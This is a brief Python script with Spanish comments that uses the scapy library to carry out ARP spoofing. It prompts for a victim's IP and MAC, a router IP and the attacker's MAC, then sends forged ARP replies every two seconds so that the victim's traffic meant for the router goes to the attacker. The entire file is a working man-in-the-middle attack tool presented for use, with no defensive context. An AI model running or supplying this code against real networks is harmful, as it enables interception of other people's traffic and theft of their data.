from scapy.all import ARP, send
import time

def arp_spoof(target_ip, target_mac, router_ip, attacker_mac):
    # Crear el paquete ARP para la víctima
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=router_ip, hwsrc=attacker_mac, op=2)
    
    try:
        print(f"Enviando paquetes ARP a {target_ip} para suplantar al router {router_ip}")
        while True:
            send(arp_response, verbose=False)
            time.sleep(2)
    except KeyboardInterrupt:
        print("ARP spoofing detenido")

if __name__ == "__main__":
    target_ip = input("Ingresa la IP de la máquina víctima: ")
    target_mac = input("Ingresa la MAC de la máquina víctima: ")
    router_ip = input("Ingresa la IP del router: ")
    attacker_mac = input("Ingresa tu dirección MAC (del atacante): ")
    arp_spoof(target_ip,target_mac, router_ip, attacker_mac)
